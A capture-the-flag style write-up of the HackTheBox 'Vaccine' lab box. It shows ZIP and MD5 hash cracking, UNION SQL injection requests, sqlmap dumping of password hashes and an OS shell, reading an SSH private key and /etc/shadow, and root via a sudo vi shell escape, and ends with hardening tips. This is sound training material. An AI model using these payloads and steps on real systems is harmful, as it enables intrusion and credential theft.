---
title: "HTB Starting Point: Vaccine"
seoTitle: "HackTheBox Starting Point: Vaccine write-up"
seoDescription: "Complete write-up for Vaccine hacking box from HackTheBox with additional comments and educational materials."
datePublished: Mon Jul 12 2021 04:27:02 GMT+0000 (Coordinated Universal Time)
cuid: ckr04j9u70pgd5bs11ess9nmj
slug: htb-starting-point-vaccine
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1625919559495/C_t1HYbpY.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1626063959897/8wYyfpYzi.png
tags: learning, hacking, cybersecurity-1

---

`Vaccine` is a 3rd box from Starting Point path on [HackTheBox Starting Point - Tier 2](https://blog.cyberethical.me/go-htbapp). This path is composed of 9 boxes in a way that later boxes use information (like credentials) gathered from the previous ones. See the other write-ups [here](https://blog.cyberethical.me/series/htb-starting-point).

This box features working with MD5 hashes and escaping user context to root by exploiting sudoer misconfiguration.

# Basic Information

| # |  |
| --- | --- |
| Type | Starting Point |
| Name | \*\* Hack The Box / Vaccine\*\* |
| Pwned | 2021/06/01 |
| URLs | [Starting Point - Tier 2](https://blog.cyberethical.me/go-htbapp) |
| Author | **Asentinn** / OkabeRintaro |
|  | [https://ctftime.org/team/152207](https://ctftime.org/team/152207) |

%%[patreon-btn] 

# Target of Exploration

Setting shell variable `IP=10.10.10.28`

# Recon

```txt
$ sudo nmap -A $IP

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-30 21:08 CEST
Nmap scan report for 10.10.10.46
Host is up (0.073s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=5/30%OT=21%CT=1%CU=39819%PV=Y%DS=2%DC=T%G=Y%TM=60B3E2C
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST1
OS:1NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   44.95 ms 10.10.XX.XXX
2   94.97 ms 10.10.10.46

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.33 seconds
```

[Back to top](#contents) ⤴

## FTP (:21)

Using credentials from `Oopsie` [box](/htb-starting-point-oopsie) (`ftpuser/mc@F1l3ZilL4`):

![2277883806501.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625864014415/XFd_n9b6r.png align="left")

File is encrypted, so let's crack the password using `john`, but first prepare the input file with `zip2hash`.

> Read more about cracking ZIP passwords using `john` and `fcrackzip` in [Additional readings](#additional-readings).

```txt
$ zip2john backup.zip > zip.hash
```

![820195595593.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879527115/PEOhnJpfE.png align="left")

![4483618921344.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879534792/MH4_q9iIl.png align="left")

```txt
$ john --wordlist=/usr/wl/rockyou.txt zip.hash
```

![5799683869748.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879551999/Y7D4RP-fQ.png align="left")

```sh
$ unzip backup.zip

Archive:  backup.zip
[backup.zip] index.php password:
  inflating: index.php
  inflating: style.css
```

## Backup

In the `index.php` we can see there is a MD5 hash comparison - by cracking this hash we can get password for `admin`.

```php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
```

This time, [CrackStation](https://crackstation.net/) finds the plain text right away.

![5258309278801.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879571068/gNZCDsZvm.png align="left")

Save for later and let's come back to the recon - website.

`$ echo 'admin|qwerty789' | tee -a ../.credentials`

[Back to top](#contents) ⤴

## Website (:80)

![1736916102868.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880107903/E36OLXFMQ.png align="left")

By using the `admin/qwerty789` credentials, I can access the dashboard.

![4725115556390.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880099771/IypPaW8IP.png align="left")

By intercepting the requests in `burpsuite` and making prepared requests in the repeater, I can recognize the select used to get the dashboard is using 5 columns.

```txt
GET /dashboard.php?search='%20ORDER%20BY%206;-- HTTP/1.1

ERROR:  ORDER BY position 6 is not in select list
LINE 1: Select * from cars where name ilike '%' ORDER BY 6;--%'
```

> More details on how `order by` helps in `UNION` injection at [Additional readings](#additional-readings).

So, we can exploit that by using the `UNION` injection. For example, here is the schema names dump:

```txt
GET /dashboard.php?search='UNION+ALL+SELECT+NULL,concat(schema_name),NULL,NULL,NULL+FROM+information_schema.schemata%3b-- HTTP/1.1
```

> It happens that during this enumeration there are lefovers after previous hackers. Actual schemas list is in next section.

```html
<tr>
    <td class='lalign'>information_schema</td>
    <td></td>
    <td></td>
    <td></td>
</tr>
<tr>
    <td class='lalign'>public</td>
    <td></td>
    <td></td>
    <td></td>
</tr>
<tr>
    <td class='lalign'>pg_catalog</td>
    <td></td>
    <td></td>
    <td></td>
</tr>
<tr>
    <td class='lalign'>pg_toast_temp_1</td>
    <td></td>
    <td></td>
    <td></td>
</tr>
<tr>
    <td class='lalign'>pg_temp_1</td>
    <td></td>
    <td></td>
    <td></td>
</tr>
<tr>
    <td class='lalign'>pg_toast</td>
    <td></td>
    <td></td>
    <td></td>
</tr>
```

[Back to top](#contents) ⤴

## Injectable parameter vulnerability

There is an easier and automated way of doing this - using `sqlmap` we can get databases and more with single script call. Now, getting the schemas listing:

```txt
$ sqlmap -u 10.10.10.46/dashboard.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch --dbs

[20:48:46] [INFO] fetching database (schema) names
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public
```

Here I'm dumping the `pg_config` table in `pg_catalog` schema. `--batch` is used to accept any prompts `sqlmap` is making.

```txt
$ sqlmap -u 10.10.10.46/dashboard.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch -D pg_catalog -T pg_config --dump

name,setting
BINDIR,/usr/lib/postgresql/11/bin
CC,gcc
CFLAGS,-Wall -Wmissing-prototypes -Wpointer-arith -Wdeclaration-after-statement -Wendif-labels -Wmissing-format-attribute -Wformat-security -fno-strict-aliasing -fwrapv -fexcess-precision=standard -Wno-format-truncation -Wno-stringop-truncation -g -g -O2 -fstack-protector-strong -Wformat -Werror=format-security -fno-omit-frame-pointer
CFLAGS_SL,-fPIC
CONFIGURE,"'--build=x86_64-linux-gnu' '--prefix=/usr' '--includedir=/usr/include' '--mandir=/usr/share/man' '--infodir=/usr/share/info' '--sysconfdir=/etc' '--localstatedir=/var' '--disable-silent-rules' '--libdir=/usr/lib/x86_64-linux-gnu' '--libexecdir=/usr/lib/x86_64-linux-gnu' '--disable-maintainer-mode' '--disable-dependency-tracking' '--with-icu' '--with-tcl' '--with-perl' '--with-python' '--with-pam' '--with-openssl' '--with-libxml' '--with-libxslt' 'PYTHON=/usr/bin/python' '--mandir=/usr/share/postgresql/11/man' '--docdir=/usr/share/doc/postgresql-doc-11' '--sysconfdir=/etc/postgresql-common' '--datarootdir=/usr/share/' '--datadir=/usr/share/postgresql/11' '--bindir=/usr/lib/postgresql/11/bin' '--libdir=/usr/lib/x86_64-linux-gnu/' '--libexecdir=/usr/lib/postgresql/' '--includedir=/usr/include/postgresql/' '--with-extra-version= (Ubuntu 11.5-1)' '--enable-nls' '--enable-integer-datetimes' '--enable-thread-safety' '--enable-tap-tests' '--enable-debug' '--enable-dtrace' '--disable-rpath' '--with-uuid=e2fs' '--with-gnu-ld' '--with-pgport=5432' '--with-system-tzdata=/usr/share/zoneinfo' '--with-llvm' '--with-systemd' '--with-selinux' 'MKDIR_P=/bin/mkdir -p' 'TAR=/bin/tar' 'CFLAGS=-g -O2 -fstack-protector-strong -Wformat -Werror=format-security -fno-omit-frame-pointer' 'LDFLAGS=-Wl,-Bsymbolic-functions -Wl,-z,relro -Wl,-z,now' '--with-gssapi' '--with-ldap' '--with-includes=/usr/include/mit-krb5' '--with-libs=/usr/lib/mit-krb5' '--with-libs=/usr/lib/x86_64-linux-gnu/mit-krb5' 'build_alias=x86_64-linux-gnu' 'CPPFLAGS=-Wdate-time -D_FORTIFY_SOURCE=2' 'CXXFLAGS=-g -O2 -fstack-protector-strong -Wformat -Werror=format-security'"
CPPFLAGS,-Wdate-time -D_FORTIFY_SOURCE=2 -D_GNU_SOURCE -I/usr/include/libxml2 -I/usr/include/mit-krb5
DOCDIR,/usr/share/doc/postgresql-doc-11
HTMLDIR,/usr/share/doc/postgresql-doc-11
INCLUDEDIR,/usr/include/postgresql
INCLUDEDIR-SERVER,/usr/include/postgresql/11/server
LDFLAGS,"-Wl,-Bsymbolic-functions -Wl,-z,relro -Wl,-z,now -L/usr/lib/llvm-7/lib -L/usr/lib/x86_64-linux-gnu/mit-krb5 -Wl,--as-needed"
LDFLAGS_EX,<blank>
LDFLAGS_SL,<blank>
LIBDIR,/usr/lib/x86_64-linux-gnu
LIBS,-lpgcommon -lpgport -lpthread -lselinux -lxslt -lxml2 -lpam -lssl -lcrypto -lgssapi_krb5 -lz -ledit -lrt -lcrypt -ldl -lm 
LOCALEDIR,/usr/share/locale
MANDIR,/usr/share/postgresql/11/man
PGXS,/usr/lib/postgresql/11/lib/pgxs/src/makefiles/pgxs.mk
PKGINCLUDEDIR,/usr/include/postgresql
PKGLIBDIR,/usr/lib/postgresql/11/lib
SHAREDIR,/usr/share/postgresql/11
SYSCONFDIR,/etc/postgresql-common
VERSION,PostgreSQL 11.5 (Ubuntu 11.5-1)
```

Let's check what users we have access and which privileges that user has.

```txt
$ sqlmap -u $IP/dashboard.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch --users
```

![1221481927212.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879601334/Iv04MRhgU.png align="left")

```txt
$ sqlmap -u $IP/dashboard.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch -U postgres --roles
```

![1282818797398.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625951019024/WZxWiadal.png align="left")

Ok, let's dump the password hash for `postgres` and exploit that `super` permission.

```txt
sqlmap -u $IP/dashboard.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch --password
```

![2708755891538.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879626411/IAyJBha1o.png align="left")

[Back to top](#contents) ⤴

# User shell

`sqlmap` presents easy way to gain shell when database user have enough privileges on database.

```txt
sqlmap -u $IP/dashboard.php --forms --cookie="PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6" --batch --os-shell
```

![3162090529455.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880011508/zp2lOteVH.png align="left")

We've got the `postgres` user shell. And by using `id` we can see that user is in `ssl-cert` group. That means we should maybe find an SSH keys?

![4501945095047.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880000639/vPaLErb5l.png align="left")

![2218217336621.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625879990698/Lx7SgGx71.png align="left")

Bingo.

```txt
os-shell> cat /var/lib/postgresql/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA0a5cdsLhNwBeZvZB5tYxL80+03AaJwcnAyEzffSXcluql1xNztZr
....
7Dj1cDAVWXOqAJO9Ks3PLh6P7eP36lg2w/4/CHkvTmdJ9yr7nLclP5QS/gWghlTl2SkoIq
r1Y3QWupZhHES9swAAABBwb3N0Z3Jlc0B2YWNjaW5lAQ==
-----END OPENSSH PRIVATE KEY-----
```

I'm copying the key to a file on my local machine, `chmod 600` it and converting with `ssh-keygen -f vaccine.id_rsa -p` using no password I can connect to SSH.

> Rember to leave a empty line at the end of the key file, otherwise you will get the "invalid format" error.

```txt
$ ssh -i vaccine.id_rsa postgres@$IP

postgres@vaccine:~$ id
uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
```

[Back to top](#contents) ⤴

## Directory traversing

Let's find what other users with shell are on the server.

```txt
postgres@vaccine:~$ cat /etc/passwd | grep -v nologin
```

> `-v` to invert mach - lines that do not match `nologin`, you should also filter out `/bin/false` strings

![1081383767677.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880029804/Tr5pXb6VZ.png align="left")

Maybe it can come in handy later.

When you have the access to the server when PHP files are served, good practice is to go through them because often you can find credentials there, ex. for databases. This website was serving a `dashboard.php` file and default website hosting folder is `/var/www/html` (Apache) so let's see.

```txt
postgres@vaccine:~$ cat /var/www/html/dashboard.php
```

![3006043138502.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880038827/JsU1s4aW9.png align="left")

New credentials:

`$ echo 'postgres|P@s5w0rd!' | tee -a ../.credentials`

[Back to top](#contents) ⤴

# Privilege Escalation

> 🔔 `CyberEthical.Me` is maintained purely from your donations - consider one-time sponsoring on the [Sponsor](/sponsor) button or 🎁 [become a Patron](https://www.patreon.com/cyberethicalme) which also gives you some bonus perks.

![3899212738531.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880051716/nUGWx38aS.png align="left")

In `vi` you can run system commands using `:!` command... so let's exploit that.

```txt
postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

And inside `vi` type `:! /bin/sh`

Boom.

![1791832992803.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880069325/DVADCDKFG.png align="left")

![1567896233080.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880061892/kyqzsUOoG.png align="left")

[Back to top](#contents) ⤴

# Post exploits

> Like what you see? Join the [Hashnode.com](/join) now. Things that are awesome:

> ✔ Automatic GitHub Backup

> ✔ Write in Markdown

> ✔ Free domain mapping

> ✔ CDN hosted images

> ✔ Free in-built newsletter service

> By using my link you can help me unlock the ambasador role, which cost you nothing and gives me some additional features to support my content creation mojo.

Now that we have the root access, maybe we can crack something from `shadow` file?

```txt
cat /etc/shadow | grep -vF :*: | grep -vF :!:
```

![2267952157893.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625880079349/aqvO6cSFp.png align="left")

```txt
root:$6$mJFt2hPm87QQnTTe$iQR6I/fnw56HY7KABpVORJ4uabDHfWILJLAj0PTswex.epHHMhcRAoR08J3MrHPYu3SFd67DoUdaLSFYxwE4/1:18296:0:99999:7:::
systemd-coredump:!!:18295::::::
simon:$6$HmDDB89I3xFM2mJe$DNf5vRLvByV6U4VND/p2VfYYX8/s5apU3j3gk/2Y7A6Q8adNfDKHBFhw71i1gJ7kRUO7rqFX90h3sp4O6K1p20:18295:0:99999:7:::
postgres:$6$mbGAgq2J4ZtuYuWl$9GBi2iuMl6Io6GaxOtiWcbpg2CM6QxWNgSexoc97osVx3TQFv6SEld/339z0fyrgDxQBQxbUQDa6PkVeahpO3.:18296:0:99999:7:::
ftpuser:$6$vbS2lINzTKdW.wYi$1Xxvomaxm3u.su5B0IompTFJJS8Ax1V0bgYRDBjgwick/d6WITZzq44MXeFbKl8RmsF3TzyN/ey9clfhW8iE0/:18295:0:99999:7:::
```

Especially I was targeting the `simon` account, but dictionary attack wasn't enough to crack it.

[Back to top](#contents) ⤴

# Hardening ideas

## sudoer permissions

Well, for a starter, be careful when granting such ludicrous permissions as ability to sudo binary that can launch shell or execute system commands.

At least don't grand sudo to `vi` family.

## Don't trust user input

Never, ever use unparsed or unescaped value that comes from user input or user controlled variable - POST, GET variables, cookies or files, etc. In every language there is a injection prevention technique.

## Don't reuse the passwords.

Just don't.

[Back to top](#contents) ⤴

# Additional readings

> 📌 Follow the `#CyberEthical` hashtag on the social media

> 👉 Instagram: [@cyber.ethical.me](https://www.instagram.com/cyber.ethical.me/)

> 👉 LinkedIn: [Kamil Gierach-Pacanek](https://www.linkedin.com/in/kamilpacanek)

> 👉 Twitter: [@cyberethical\_me](https://twitter.com/cyberethical_me)

> 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe)

* [How to crack zip password on Kali Linux](https://linuxconfig.org/how-to-crack-zip-password-on-kali-linux)
    
* [SQL Injection - Exploiting Union Based @ HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection#exploiting-union-based)
    
* [The Ultimate SQL Injection Cheat Sheet](https://www.hackingloops.com/sql-injection-cheat-sheet/)
    

#### Check other write-ups from the Starting Point path - links below the article, or navigate directly to the series [here](/series/htb-starting-point).

[Back to top](#contents) ⤴